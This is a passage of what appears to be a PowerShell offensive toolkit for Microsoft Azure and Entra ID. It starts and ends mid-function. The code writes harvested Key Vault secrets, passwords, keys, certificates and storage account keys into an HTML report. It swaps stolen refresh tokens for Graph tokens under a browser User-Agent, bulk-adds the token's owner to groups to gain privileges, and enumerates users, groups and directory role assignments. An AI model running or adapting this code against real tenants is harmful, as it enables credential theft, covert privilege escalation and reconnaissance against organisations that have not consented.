								Show-MainMenu
								$FoundGREAT = $false
								$FoundConflict = $false
								$FoundWOW = $false
								$FoundBAD = $false
								break
							 }
							 "2" {
								 Write-Host "[+] Continue script..." -ForegroundColor Green
							 }
							 default {
								 Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							 }
						 }
					 }
				 }
				
				if ($FoundGREAT) {
					Write-Host "      [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundConflict) {
					Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor Yellow
					Write-Host " "
				}
				if ($FoundWOW) {
					Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundBAD) {
					Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
					Write-Host " "
				}
				if (-not ($FoundGREAT -or $FoundConflict -or $FoundWOW -or $FoundBAD)) {
					#Write-Host "    [-] No special permissions found" -ForegroundColor Red
					
				}
				
				if ($FoundGREAT -or $FoundWOW) {
                    $Results += [PSCustomObject]@{
                        SubscriptionName = $subName
                        ResourceGroup    = $vmRg   
                        ResourceName     = $vmName 
                        ResourceType     = "VirtualMachine" 
                    }
                }
            }
        }
    }

if ($Results.Count -gt 0) {

# Header
$htmlHeader = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Permissions Report</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <style>
        body {
            padding: 20px;
            background-color: #f0f2f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        h1 {
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            color: #007bff;
        }
        .nav-tabs .nav-link {
            color: #007bff;
        }
        .nav-tabs .nav-link.active {
            color: white;
            background-color: #007bff;
        }
        .table {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        table.dataTable td, table.dataTable th {
            white-space: normal; 
            word-break: break-word; 
            max-width: 400px; 
        }
        table.dataTable th {
            background-color: #007bff;
            color: white;
        }
        .copy-btn, .view-btn {
            margin-top: 3px;
            display: inline-block;
            font-size: 12px;
            padding: 3px 8px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            color: white;
            transition: background-color 0.3s;
        }
        .copy-btn {
            background-color: #28a745;
        }
        .copy-btn:hover {
            background-color: #218838;
        }
        .view-btn {
            background-color: #6c757d;
            margin-left: 5px;
        }
        .view-btn:hover {
            background-color: #5a6268;
        }
        .modal-content {
            word-break: break-word;
        }
    </style>
</head>

<body>

<h1>Permissions Report</h1>

<div class="container-fluid">
    <ul class="nav nav-tabs mb-3" id="permissionsTab" role="tablist">
        <li class="nav-item">
            <button class="nav-link active" id="kv-tab" data-bs-toggle="tab" data-bs-target="#kv" type="button" role="tab">Key Vaults</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="sa-tab" data-bs-toggle="tab" data-bs-target="#sa" type="button" role="tab">Storage Accounts</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="vm-tab" data-bs-toggle="tab" data-bs-target="#vm" type="button" role="tab">Virtual Machines</button>
        </li>
    </ul>

    <div class="tab-content" id="permissionsTabContent">
"@


$KeyVaults = $Results | Where-Object { $_.ResourceType -match "^KeyVault" }
$StorageAccounts = $Results | Where-Object { $_.ResourceType -eq "StorageAccount" }
$VirtualMachines = $Results | Where-Object { $_.ResourceType -eq "VirtualMachine" }

$GroupedKeyVaults = $KeyVaults | Group-Object -Property ResourceName


$htmlKV = @"
<div class="tab-pane fade show active" id="kv" role="tabpanel" aria-labelledby="kv-tab">
    <table id="kvTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Secrets</th>
            <th>Keys</th>
            <th>Certificates</th>
        </tr></thead>
        <tbody>
"@

$htmlKV += ($GroupedKeyVaults | ForEach-Object {
    $kvGroup = $_.Group
    $subName = $kvGroup[0].SubscriptionName
    $rgName = $kvGroup[0].ResourceGroup
    $kvName = $kvGroup[0].ResourceName

    $secrets = @()
    $keys = @()
    $certs = @()

    foreach ($item in $kvGroup) {
        switch ($item.ResourceType) {
            "KeyVault-Secret-Pair" { 
                $secrets += "$($item.SecretBaseName)-username: $($item.Username)<br>$($item.SecretBaseName)-password: $($item.Password)" 
            }
            "KeyVault-Secret" {
                $secrets += "$($item.SecretBaseName): $($item.SecretValue)"
            }
            "KeyVault-Key" {
                $keys += "$($item.KeyName): $($item.KeyValue)"
            }
            "KeyVault-Certificate" {
                $certs += "$($item.CertificateName): $($item.CertificateValue)"
            }
        }
    }

    $secretsCell = if ($secrets.Count -gt 0) { $secrets -join "<br>" } else { "<span class='badge bg-secondary'>No Secrets</span>" }
    $keysCell = if ($keys.Count -gt 0) { $keys -join "<br>" } else { "<span class='badge bg-secondary'>No Keys</span>" }
    $certsCell = if ($certs.Count -gt 0) { $certs -join "<br>" } else { "<span class='badge bg-secondary'>No Certificates</span>" }

    "<tr>
        <td>$subName</td>
        <td>$rgName</td>
        <td>$kvName</td>
        <td>$secretsCell</td>
        <td>$keysCell</td>
        <td>$certsCell</td>
    </tr>"
}) -join "`n"

$htmlKV += @"
        </tbody>
    </table>
</div>
"@

# -- Storage Accounts Table
$htmlSA = @"
<div class="tab-pane fade" id="sa" role="tabpanel" aria-labelledby="sa-tab">
    <table id="saTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Key1</th>
            <th>Key2</th>
        </tr></thead>
        <tbody>
"@

$htmlSA += ($StorageAccounts | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
        <td style='word-break: break-word;'>$($_.Key1)</td>
        <td style='word-break: break-word;'>$($_.Key2)</td>
    </tr>"
}) -join "`n"

$htmlSA += @"
        </tbody>
    </table>
</div>
"@

# -- Virtual Machines Table
$htmlVM = @"
<div class="tab-pane fade" id="vm" role="tabpanel" aria-labelledby="vm-tab">
    <table id="vmTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
        </tr></thead>
        <tbody>
"@

$htmlVM += ($VirtualMachines | ForEach-Object {
    "<tr>
        <td>$($_.SubscriptionName)</td>
        <td>$($_.ResourceGroup)</td>
        <td>$($_.ResourceName)</td>
    </tr>"
}) -join "`n"

$htmlVM += @"
        </tbody>
    </table>
</div>
"@

$htmlFooter = @"
    </div> <!-- End tab-content -->

</div> <!-- End container -->

<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>

<script>
`$(document).ready(function() {
    $('#kvTable').DataTable({ scrollX: true });
    $('#saTable').DataTable({ scrollX: true });
    $('#vmTable').DataTable({ scrollX: true });
});
</script>

</body>
</html>
"@

# ----------------------------------------------------------------

$htmlContent = $htmlHeader + $htmlKV + $htmlSA + $htmlVM + $htmlFooter

$htmlFilePath = "C:\Users\Public\Invoke-ResourcePermissions-Report.html"
$htmlContent | Set-Content -Path $htmlFilePath -Encoding UTF8

Write-Host "`n[+] Report saved to $htmlFilePath" -ForegroundColor Green

}
else {
    Write-Host "`n[-] No interesting resources found. No report generated." -ForegroundColor Yellow
}


}


<#################################################################################################################################################>
function Invoke-MembershipChange {

    param(
        [string]$RefreshToken,
        [string]$GraphAccessToken,
		[string]$ClientID,
		[string]$ClientSecret,
		[string]$UserID,
		[string]$TenantID,
        [string]$Action,
        [string]$GroupIdsInput,
        [string]$SuccessLogFile = "C:\Users\Public\success_log.txt",
		[string]$SuccessRenoveLogFile = "C:\Users\Public\success_Remove_log.txt"
		
    )
    
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID,
            [string]$RefreshToken
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[-] Failed to get access token: $_" -ForegroundColor Red
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

	    function Decode-JWT {
            param([Parameter(Mandatory = $true)][string]$Token)
            $tokenParts = $Token.Split(".")
            $payload = $tokenParts[1].Replace('-', '+').Replace('_', '/')
            switch ($payload.Length % 4) { 2 { $payload += "==" }; 3 { $payload += "=" } }
            $bytes = [System.Convert]::FromBase64String($payload)
            return ([System.Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
	    }
	
		if($UserID){
			$MemberId = $UserID
            Write-Host "[*] Using MemberId $MemberId" -ForegroundColor DarkYellow
		}
		else {
			$DecodedToken = Decode-JWT -Token $GraphAccessToken
			$MemberId = $DecodedToken.oid
            Write-Host "[*] MemberId extracted: $MemberId" -ForegroundColor DarkYellow
		}
	
        $GroupIds = if (Test-Path $GroupIdsInput) {
            Get-Content -Path $GroupIdsInput | Where-Object { $_.Trim() -ne "" }
        } else {
            @($GroupIdsInput)
        }

        if ($Action -eq "add" -and (Test-Path $SuccessLogFile)) { Remove-Item $SuccessLogFile -Force }

        $StartTime = Get-Date

        foreach ($GroupId in $GroupIds) {

            if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                Write-Host "[...] Refreshing Access Token" -ForegroundColor DarkYellow
                $GraphAccessToken = Get-TokenWithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
                $StartTime = Get-Date
            }
            $Headers = @{
                'Authorization' = "Bearer $GraphAccessToken"
                'Content-Type'  = 'application/json'
                'User-Agent'    = "$UserAgent"
            }
            $RetryCount = 0
            $MaxRetries = 5
            $Success = $false

            do {
                try {
					
                    if ($Action -eq "add") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/`$ref"
                        $Body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$MemberId" } | ConvertTo-Json
                        Invoke-RestMethod -Method POST -Uri $Url -Headers $Headers -Body $Body -ContentType "application/json"
                        Write-Host "[+] Added $MemberId to $GroupId" -ForegroundColor Green
                        
                        Add-Content -Path $SuccessLogFile -Value $GroupId
                        $Success = $true
						if ([Console]::KeyAvailable) {
							$key = [Console]::ReadKey($true)
							if ($key.Key -eq "Enter") {
								Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
								Write-Host "[1] Back To Menu"
								Write-Host "[2] Continue"
								$whatdoyou = Read-Host "Enter your choice"

								switch ($whatdoyou) {
									"1" {
										$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
										Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
										Show-MainMenu
										$Success = $false
										break
									}
									"2" {
										Write-Host "[+] Continue script..." -ForegroundColor Green
									}
									default {
										Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
									}
								}
							}
						}
                    } elseif ($Action -eq "delete") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/$MemberId/`$ref"
                        Invoke-RestMethod -Method DELETE -Uri $Url -Headers $Headers
                        Write-Host "[+] Removed $MemberId from $GroupId" -ForegroundColor Green
                        Add-Content -Path $SuccessRenoveLogFile -Value $GroupId
                        $Success = $true
						if ([Console]::KeyAvailable) {
							$key = [Console]::ReadKey($true)
							if ($key.Key -eq "Enter") {
								Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
								Write-Host "[1] Back To Menu"
								Write-Host "[2] Continue"
								$whatdoyou = Read-Host "Enter your choice"

								switch ($whatdoyou) {
									"1" {
										$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
										Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
										Show-MainMenu
										$Success = $false
										break
									}
									"2" {
										Write-Host "[+] Continue script..." -ForegroundColor Green
									}
									default {
										Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
									}
								}
							}
						}
                    }

                } catch {
                    $Response = $_.Exception.Response
                    $StatusCode = 0
                    $ErrorMessage = "Unknown Error"

                    if ($Response) {
                        $StatusCode = $Response.StatusCode.value__
                        try {
                            $Stream = $Response.GetResponseStream()
                            $Reader = New-Object System.IO.StreamReader($Stream)
                            $RawBody = $Reader.ReadToEnd()
                            $JsonBody = $RawBody | ConvertFrom-Json
                            $ErrorMessage = $JsonBody.error.message
                        } catch {
                            $ErrorMessage = "Failed to parse error response."
                        }
                    }

                    if ($StatusCode -eq 429) {
                        $retryAfter = 7
                        if ($Response.Headers["Retry-After"]) {
                            $retryAfter = [int]$Response.Headers["Retry-After"]
                        }
                        Write-Host "[!] 429 Rate Limit - Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds $retryAfter
                        $RetryCount++
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "add" -and $ErrorMessage -match "already exist") {
                        Write-Host "[=] Member already exists in ${GroupId}." -ForegroundColor Yellow
                        $Success = $true
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "delete") {
                        Write-Host "[-] Error during DELETE from ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                    else {
                        Write-Host "[-] Unexpected error during $Action for ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                }
            } while (-not $Success -and $RetryCount -lt $MaxRetries)
            Start-Sleep -Milliseconds 300
        }
}



<#################################################################################################################################################>
function Invoke-FindGroup {
    param (
        [string]$GraphAccessToken,
        [string]$RefreshToken,
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$TenantID,
        [string]$Word,
        [string]$TenantName
    )


    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $StartTime = Get-Date

	$OutputFile = "C:\Users\Public\FindGroup.txt"
	if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID,
            [string]$RefreshToken
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[-] Failed to get access token: $_" -ForegroundColor Red
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

    function Write-Log {
        param(
            [string]$Message
        )
        $OutputFile = "C:\Users\Public\FindGroup.txt"
        Add-Content -Path $OutputFile -Value $Message
    }

    function Invoke-WithRetry {
        param (
            [string]$Method,
            [string]$Uri,
            [hashtable]$Headers,
            [int]$MaxRetries = 5
        )

        $attempt = 0
        while ($true) {			
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq "Enter") {
					Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
					Write-Host "[1] Back To Menu"
					Write-Host "[2] Continue"
					$whatdoyou = Read-Host "Enter your choice"

					switch ($whatdoyou) {
						"1" {
							$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
							Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
							Show-MainMenu
							$attempt = 0
							break
						}
						"2" {
							Write-Host "[+] Continue script..." -ForegroundColor Green
						}
						default {
							Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
						}
					}
				}
			} 
            try {
                return Invoke-RestMethod -Method $Method -Uri $Uri -Headers $Headers -ErrorAction Stop
				
            }
            catch {
                if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                if ($retryAfter) {
                    Write-Host "[X] Rate limit hit. Retrying after $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                } else {
                    Write-Host "[X] Rate limit hit. Retrying after default 60 seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds 60
                }
            }
                if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                    Write-Host "[...] Refreshing Access Token" -ForegroundColor DarkYellow
                    if ($authMethod -eq "client") {
                        $GraphAccessToken = Get-TokenWithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                    }
                    if ($authMethod -eq "refresh") {
                        $GraphAccessToken = Get-TokenWithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
                    }
                    $StartTime = Get-Date
                    $headers = @{
                        "Authorization" = "Bearer $GraphAccessToken"
                        "Content-Type"  = "application/json"
                        "User-Agent"    = "$UserAgent"
                    }
                }
            }
        }
    }

        $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Write-Host ""
        Write-Host "==================== Invoke-FindGroup ====================" -ForegroundColor DarkCyan
        Write-Host "[>>] Started filtered group search by word '$word' in tenant: $TenantName" -ForegroundColor DarkCyan
        Write-Host "[>>] Timestamp: $a" -ForegroundColor DarkCyan
        Write-Host "===========================================================" -ForegroundColor DarkCyan
        Write-Host ""


    $headers = @{ 
        Authorization = "Bearer $GraphAccessToken" 
        'User-Agent' = $UserAgent
        }
            function Get-AllGroups {
            param (
                [hashtable]$Headers
            )

            $groups = @()
            $url = "https://graph.microsoft.com/v1.0/groups?$select=id,displayName,isAssignableToRole"

            while ($url) {
                $response = Invoke-WithRetry -Method GET -Uri $url -Headers $Headers
                if ($response -eq $null) { break }

                $groups += $response.value
                $url = $response.'@odata.nextLink'
            }

            return $groups
        }

    $groups = Get-AllGroups -Headers $headers
    if ($groups -eq $null -or $groups.Count -eq 0) { return }

    if ($Word) {
        $filteredGroups = $groups | Where-Object { $_.displayName -and $_.displayName.ToLower() -like "*$($Word.ToLower())*" }
        Write-Host "[>] Filter applied: "$Word". Matching groups: $($filteredGroups.Count)"
    } else {
        $filteredGroups = $groups.value
        Write-Host "[>] No filter provided. Total groups: $($filteredGroups.Count)"
    }   


    $directoryRoles = Invoke-WithRetry -Method GET -Uri "https://graph.microsoft.com/v1.0/directoryRoles" -Headers $headers
    if ($directoryRoles -eq $null) { return }

    $groupToRolesMap = @{}

    foreach ($role in $directoryRoles.value) {
        $roleId = $role.id
        $roleName = $role.displayName

        $members = Invoke-WithRetry -Method GET -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members" -Headers $headers
        if ($members -eq $null) { continue }

        $groupMembers = $members.value | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.group' }
        foreach ($member in $groupMembers) {
            $groupToRolesMap[$member.id] += $roleName
        }
    }

        foreach ($group in $filteredGroups) {
            $groupId = $group.id
            $groupName = $group.displayName
            $roleAssignable = $group.isAssignableToRole

            $add = "Group: $groupName ($groupId)"
            $add2 = " ↳ Role-Assignable: $roleAssignable"
            write-host "$add"
            Write-Host "$add2"
            Write-Log -Message "$add"
            Write-Log -Message "$add2"


            if ($groupToRolesMap.ContainsKey($groupId)) {
                foreach ($role in $groupToRolesMap[$groupId]) {
                    $add3 =  "  ↳ Assigned to Entra Role: $role"
                    Write-Host "$add3"
                    Write-Log -Message "$add3"

                }
            }

            Write-Host""
        }

        $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Write-Host "[>>] Operation Exported to C:\Users\Public\FindGroup.txt" -ForegroundColor DarkCyan
        Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan
}


<#################################################################################################################################################>
function Invoke-FindUserByWord {
    param(
        [string]$RefreshToken,
	    [string]$TenantID,
	    [string]$TenantName,
	    [string]$GraphAccessToken,
	    [string]$ClientID,
	    [string]$ClientSecret,
	    [string]$Word
    )

	$OutputFile = "FoundUsers.txt"
	if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }


    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

	$OutputFile = "C:\Users\Public\UserList.txt"
	if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }

    function Write-Log {
        param(
            [string]$Message
        )
        $OutputFile = "C:\Users\Public\UserList.txt"
        Add-Content -Path $OutputFile -Value $Message
    }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID,
            [string]$RefreshToken
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[X] Failed to get access token: $_" -ForegroundColor Red
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }
    

    $StartTime = Get-Date
    $UsersUrl = "https://graph.microsoft.com/v1.0/users"
    $ListUsers = @()

    $Headers = @{
        "Authorization" = "Bearer $GraphAccessToken"
        "Content-Type"  = "application/json"
        "User-Agent"    ="$UserAgent"
    }

    $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "==================== Invoke-FindUserByWord ====================" -ForegroundColor DarkCyan
    Write-Host "[>>] Started filtered user by word '$word' search in tenant: $TenantName" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $a" -ForegroundColor DarkCyan
    Write-Host "===========================================================" -ForegroundColor DarkCyan
    Write-Host ""

    while ($UsersUrl) {
        if ([Console]::KeyAvailable) {
			$key = [Console]::ReadKey($true)
			if ($key.Key -eq "Enter") {
				Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
				Write-Host "[1] Back To Menu"
				Write-Host "[2] Continue"
				$whatdoyou = Read-Host "Enter your choice"

				switch ($whatdoyou) {
					"1" {
						$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
						Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
						Show-MainMenu
						break
					}
					"2" {
						Write-Host "[+] Continue script..." -ForegroundColor Green
					}
					default {
						Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
					}
				}
			}
		} 
        if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
            Write-Host "[...] Refreshing Access Token" -ForegroundColor DarkYellow
            if ($authMethod -eq "client") {
                $GraphAccessToken = Get-TokenWithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
            }
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-TokenWithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
            }
            $StartTime = Get-Date
            $headers = @{
                "Authorization" = "Bearer $GraphAccessToken"
                "Content-Type"  = "application/json"
                "User-Agent"    = "$UserAgent"
            }
        }

        try {
            $Response = Invoke-RestMethod -Method Get -Uri $UsersUrl -Headers $Headers -ErrorAction Stop
            foreach ($User in $Response.value) {
                if ( ($User.displayName -like "*$Word*" -or $User.mail -like "*$Word*" -or $User.userPrincipalName -like "*$Word*" -or $User.givenName -like "*$Word*" -or $User.surname -like "*$Word*")) 
                {
					$ListUsers += $User
                    $Line = "$($User.displayName) | $($User.userPrincipalName)"
                    Add-Content -Path $OutputFile -Value $Line
                    Write-Host ""
                    Write-Host "[+] Found: " -NoNewline
                    Write-Host "$($User.displayName)" -ForegroundColor Green -NoNewline
                    Write-Host " | $($User.userPrincipalName)" -ForegroundColor DarkGray
                    Write-Log -Message "$ListUsers"
                }
            }

            $UsersUrl = $Response.'@odata.nextLink'
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                if ($retryAfter) {
                    Write-Host "[X] Rate limit hit. Retrying after $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                } else {
                    Write-Host "[X] Rate limit hit. Retrying after default 60 seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds 60
                }
            } else {
                Write-Warning "Failed to retrieve users: $_"
                break
            }
        }
    }

    return $ListUsers
    $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Exported to C:\Users\Public\UserList.txt" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan
}


<#################################################################################################################################################>
function Invoke-FindUserRole {

    param(
        [string]$RefreshToken,
        [string]$ClientID,
        [string]$GraphAccessToken,
        [string]$ClientSecret,
        [string]$TenantName,
        [string]$TenantID
    )

    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

	$OutputFile = "C:\Users\Public\UserAccountsWithRoles.txt"
	if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }

    function Write-Log {
        param(
            [string]$Message
        )
        $OutputFile = "C:\Users\Public\UserAccountsWithRoles.txt"
        Add-Content -Path $OutputFile -Value $Message
    }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID,
            [string]$RefreshToken
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[-] Failed to get access token: $_" -ForegroundColor DarkRed
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

    $StartTime = Get-Date
    $headers = @{
        Authorization = "Bearer $GraphAccessToken"
        "Content-Type" = "application/json"
